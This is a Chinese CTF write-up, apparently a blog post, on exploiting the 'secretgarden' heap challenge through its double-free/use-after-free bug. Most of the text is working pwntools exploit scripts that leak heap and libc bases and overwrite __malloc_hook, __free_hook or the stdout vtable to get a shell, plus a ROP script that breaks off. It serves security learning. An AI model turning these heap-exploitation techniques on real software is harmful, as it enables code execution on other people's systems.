<li>分配一个块来读取<code>flower</code>的<code>name</code>，块的大小没有限制。</li>
<li>会将<code>flower</code>的<code>color</code>读到结构体的后<code>0x18</code>位，并设置标志位为1，表示存在。</li>
<li>在<code>garden</code>结构体中找到一个为0的位置记录下<code>flower</code>,并将<code>flower</code>数目加一</li>
</ol>
<img src="//idongxia.github.io/2019/06/06/secretgarden/raise.png" style="zoom:60">

<h4 id="Visit-the-garden"><a href="#Visit-the-garden" class="headerlink" title="Visit the garden"></a><code>Visit the garden</code></h4><p>visit函数会遍历<code>garden</code>结构体，将存在且<code>flag</code>标志位为1的<code>flower</code>输出</p>
<img src="//idongxia.github.io/2019/06/06/secretgarden/visit.png" style="zoom:50">

<h4 id="Remove-a-flower-from-the-garden"><a href="#Remove-a-flower-from-the-garden" class="headerlink" title="Remove a flower from the garden"></a><code>Remove a flower from the garden</code></h4><p>移除一个<code>flower</code>会将name块释放，但是并没有将指针置0，释放之前只检测了是否存在，存在<code>double free</code>漏洞。<br><img src="//idongxia.github.io/2019/06/06/secretgarden/remove2.png" style="zoom:60"></p>
<h4 id="Clean-the-garden"><a href="#Clean-the-garden" class="headerlink" title="Clean the garden"></a><code>Clean the garden</code></h4><p><code>clean</code>函数会将flag函数为0的garden结构体释放</p>
<img src="//idongxia.github.io/2019/06/06/secretgarden/clean.png" style="zoom:70">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这道题的特点是申请的块只能编辑一次，以后只能释放，没有修改函数，而且保护都开启，本质上是使用<code>UAF +DoubleFree</code> </p>
<h4 id="利用-malloc-hook"><a href="#利用-malloc-hook" class="headerlink" title="利用_malloc_hook"></a>利用<code>_malloc_hook</code></h4><p>利用<code>malloc_hook</code>的关键点在于修改了<code>malloc_hook</code>的地址为<code>one_gadget</code>的地址后，触发会不满足条件，需要利用double free来触发<code>malloc hook</code></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">':'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">delete_name(<span class="number">1</span>)</span><br><span class="line">delete_flower()</span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line"><span class="comment">#main_arena_offset=0x7ffff7dd1b20-0x7ffff7a0d000</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">onegadet_offset=<span class="number">0xf02a4</span></span><br><span class="line">onegadet=libc_base+onegadet_offset</span><br><span class="line"><span class="comment">#----------fastbin attack------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena<span class="number">-0x33</span>),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(onegadet),<span class="string">'color'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">delete_name(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-free-hook"><a href="#利用-free-hook" class="headerlink" title="利用_free_hook"></a>利用_free_hook</h4><p>利用<code>free_hook</code>的关键点在于<code>free_hook</code>上方很大一块空间都是0，此处的方法是修改<code>topchunk</code>指向<code>free_hook</code>上方的空间，需要注意的一点是尽量用0填充空间，如果填充错了可能会导致程序出错。另一点是要做好计算。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'name :'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">'flower :'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">'flower :'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'garden:'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'/bin/sh\x00'</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">0</span>)          </span><br><span class="line">delete_name(<span class="number">1</span>)        </span><br><span class="line">delete_flower()          <span class="comment">#    234</span></span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line"><span class="comment">#main_arena_offset=0x7ffff7dd1b20-0x7ffff7a0d000</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="comment">#system_offset=0x7ffff7a52390-0x7ffff7a0d000=0x45390</span></span><br><span class="line">system_offset=<span class="number">0x45390</span></span><br><span class="line">system=libc_base+system_offset</span><br><span class="line"><span class="comment">#free_hook_offset=0x7ffff7dd37a8-0x7ffff7a0d000=0x3c67a8</span></span><br><span class="line">free_hook_offset=<span class="number">0x3c67a8</span></span><br><span class="line">free_hook=libc_base+free_hook_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'free_hook:\t'</span>+hex(free_hook)</span><br><span class="line"><span class="comment">#----------fastbin attack------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()         <span class="comment">#014</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#------change top chunk point to free_hook-0xb58</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena<span class="number">-0x33</span>),<span class="string">'color'</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena),<span class="string">'color'</span>)  </span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+<span class="string">'\x00'</span>*<span class="number">0x38</span>+p64(main_arena+<span class="number">0x30</span>)+<span class="string">'\x00'</span>*<span class="number">8</span>+p64(<span class="number">0x61</span>),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(free_hook<span class="number">-0xb58</span>),<span class="string">'color'</span>)</span><br><span class="line"><span class="comment">#----malloc until free_hook</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0xb58-0x200=0x958</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x758</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x558</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x358</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)   <span class="comment">#0x158</span></span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(system),<span class="string">'color'</span>)</span><br><span class="line">delete_name(<span class="number">4</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用IO-FILE"><a href="#利用IO-FILE" class="headerlink" title="利用IO_FILE"></a>利用IO_FILE</h4><p>主要是利用<code>fastbinattack</code>修改<code>_IO_2_1_stdout_</code>的虚表指针，将它的puts函数修改为<code>onegadet</code>的地址，此处使用了空间上的复用，尽量维持原来结构体不要变化。？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'name :'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">'flower :'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">'flower :'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'garden:'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'/bin/sh\x00'</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">0</span>)          </span><br><span class="line">delete_name(<span class="number">1</span>)        </span><br><span class="line">delete_flower()          <span class="comment">#    234</span></span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#stdout_offset=0x7ffff7dd2620-0x00007ffff7a0d000=0x3c5620</span></span><br><span class="line">stdout_offset=<span class="number">0x3c5620</span></span><br><span class="line">stdout=libc_base+stdout_offset</span><br><span class="line"></span><br><span class="line">onegadet_offset=<span class="number">0x4526a</span></span><br><span class="line">onegadet=libc_base+onegadet_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'onegadet:\t'</span>+hex(onegadet)</span><br><span class="line"><span class="comment">#----------fastbin attack------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()         <span class="comment"># #014 not too much small chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------change top chunk point to free_hook-0xb58</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(stdout+<span class="number">0xa0</span><span class="number">-0x3</span>),<span class="string">'color'</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(main_arena),<span class="string">'color'</span>) </span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x3</span>+p64(onegadet)+<span class="string">'\x00'</span>*<span class="number">0x8</span>+<span class="string">'\xff'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(stdout+<span class="number">0x78</span>) </span><br><span class="line"><span class="comment">#add(0x68,payload,'color')</span></span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'name :'</span>,str(<span class="number">0x68</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">sh.sendafter(<span class="string">'flower :'</span>,payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----malloc until free_hook</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-ROP"><a href="#利用-ROP" class="headerlink" title="利用 ROP"></a>利用 ROP</h4><ol>
<li>想要利用栈，就必须定位栈地址,可以通过<code>libc</code>上的<code>environ</code>来泄露栈地址。</li>
<li>通过gdb调试可以定位到函数返回地址，原计划修改raise_a_flower的返回地址，但是<code>malloc</code>无法分配空间到其上方，后改为修改<code>raise_a_flower</code>中调用read函数的返回地址。原因是：1、<code>malloc</code>函数刚好可以分配到read函数返回地址上方。2 其实raise_a_flower 中调用函数都会新分配一个栈空间，调用的函数返回地址都是一个位置，只用在malloc函数分配完栈上的chunk之后，才能修改，刚好read函数会向chunk里写数据，刚好可以覆盖其自己的地址。</li>
<li>利用libc来构造rop链，因为程序开启了pie，所以可以利用libc_base确定代码位置，这样在动态环境中可用</li>
<li>其实可以用fastbin_attack泄露canary的地址，与泄露栈地址方法一样。需要先通过gdb调试确定canary的位置</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'name :'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">'flower :'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">'flower :'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">'garden:'</span>,str(flower_id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_flower</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>) </span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">sh=process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">delete_name(<span class="number">0</span>)          </span><br><span class="line">delete_name(<span class="number">1</span>)        </span><br><span class="line">delete_flower()          <span class="comment">#    234</span></span><br><span class="line"><span class="comment">#---------leak heap base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'color1'</span>) <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span 